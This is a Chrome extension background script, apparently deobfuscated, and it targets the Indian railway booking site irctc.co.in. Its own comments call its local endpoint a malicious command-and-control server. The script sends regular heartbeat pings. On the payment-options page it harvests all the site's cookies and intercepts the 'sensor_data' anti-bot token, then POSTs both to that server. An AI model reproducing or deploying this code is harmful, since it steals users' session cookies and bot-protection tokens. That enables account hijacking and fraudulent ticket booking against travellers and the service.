// Flag to track if we're on the bkgPaymentOptions page
let onBkgPaymentOptions = false;

// Send a heartbeat ping to the malicious command-and-control (C2) server
async function sendPing() {
  try {
    await fetch("http://127.0.0.1:8080/ping");
  } catch (error) {}
}

// 1. Send an initial ping immediately on startup
sendPing();

// 2. Set up a recurring ping.
// The original math: -1789 + (-445 * -7) + 674 evaluates to 2000 ms (2 seconds)
const pingIntervalMs = 2000;
setInterval(sendPing, pingIntervalMs);

// 3. Trigger a ping whenever the user updates/navigates a tab to IRCTC
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (tab.url && tab.url.includes("irctc.co.in")) {
    sendPing();
  }
});

// 4. Listen for messages from content script about page changes and sensor_data
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "PAGE_CHANGED_TO_BKG_OPTIONS") {
    // User navigated to bkgPaymentOptions page
    onBkgPaymentOptions = true;
    console.log("Background: Page changed to bkgPaymentOptions, extracting cookies...");

    // Send cookies
    chrome.cookies.getAll({ domain: "irctc.co.in" }, async function (capturedCookies) {
      console.log("Captured Cookies: ", capturedCookies);
      try {
        let response = await fetch("http://127.0.0.1:8080/savecookies/", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(capturedCookies),
        });
        if (response.ok) {
          console.log("🚀 Cookies successfully sent to C# server!");
        } else {
          console.log("⚠️ C# server returned an error: ", response.status);
        }
      } catch (connectionError) {
        console.error("❌ Could not connect to C# server.", connectionError);
      }
    });
  } else if (message.type === "PAGE_LEFT_BKG_OPTIONS") {
    // User left the bkgPaymentOptions page
    onBkgPaymentOptions = false;
    console.log("Background: Page left bkgPaymentOptions");
  }
});

// 4. Intercept fetch requests with sensor_data payload to capture the token
chrome.webRequest.onBeforeRequest.addListener(
  function (details) {
    if (!onBkgPaymentOptions) {
      return;
    }

    if (details.method !== "POST" || !details.requestBody) {
      return;
    }

    let bodyString = "";
    if (details.requestBody.raw && details.requestBody.raw.length > 0) {
      try {
        bodyString = new TextDecoder("utf-8").decode(details.requestBody.raw[0].bytes);
      } catch (decodeError) {
        console.error("Error decoding request body:", decodeError);
        return;
      }
    }

    try {
      const payload = JSON.parse(bodyString);
      if (payload.sensor_data) {
        console.log("✅ Captured sensor_data via webRequest:", payload.sensor_data.substring(0, 100) + "...");
        fetch("http://127.0.0.1:8080/savesensordata/", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sensor_data: payload.sensor_data }),
        })
          .then((response) => {
            if (response.ok) {
              console.log("🚀 Sensor data successfully sent to server!");
            } else {
              console.log("⚠️ Server returned an error for sensor data: ", response.status);
            }
          })
          .catch((error) => {
            console.error("❌ Could not send sensor data.", error);
          });
      }
    } catch (e) {
      // Not JSON or parse error
    }
  },
  { urls: ["*://*.irctc.co.in/*"] },
  ["requestBody"],
);
